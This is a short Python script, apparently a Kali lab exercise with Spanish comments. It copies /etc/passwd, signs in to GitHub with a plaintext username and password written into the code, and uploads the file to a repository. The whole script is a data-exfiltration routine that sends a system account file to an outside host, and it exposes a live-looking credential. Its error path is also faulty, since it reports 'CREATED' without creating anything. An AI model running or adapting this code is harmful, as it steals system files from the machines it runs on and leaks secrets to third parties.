import subprocess
from github import Github

def run():
    # Copiar /etc/passwd a /home/kali/Desktop
    subprocess.run(['cp', '/etc/passwd', '/home/kali/Desktop'])

    # Definir las variables
    GITHUB_REPO = 'almacenlar'
    GITHUB_USER = 'lauraalmrui'
    GITHUB_PASSWORD = 'Monlau22'

    # Autenticarse en GitHub
    g = Github(GITHUB_USER, GITHUB_PASSWORD)

    repo = g.get_user().get_repo(GITHUB_REPO)
    all_files = []
    contents = repo.get_contents("almacenlar")  # Cambiado para acceder a la carpeta almacenlar en el repositorio

    while contents:
        file_content = contents.pop(0)
        if file_content.type == "dir":
            contents.extend(repo.get_contents(file_content.path))
        else:
            file = file_content
            all_files.append(str(file).replace('ContentFile(path="','').replace('")',''))

    with open('/home/kali/Desktop/passwd', 'r') as file:
        content = file.read()

    # Upload to GitHub
    git_prefix = 'lauraalmrui/'
    git_file = git_prefix + 'almacenlar/passwd'  # Cambiado para reflejar la estructura de carpetas en el repositorio

    try:
        contents = repo.get_contents(git_file)
        repo.update_file(contents.path, "committing files", content, contents.sha, branch="master")
        print(git_file + ' UPDATED')
    except Exception as e:
        print(e)
        print(git_file + ' CREATED')

run()

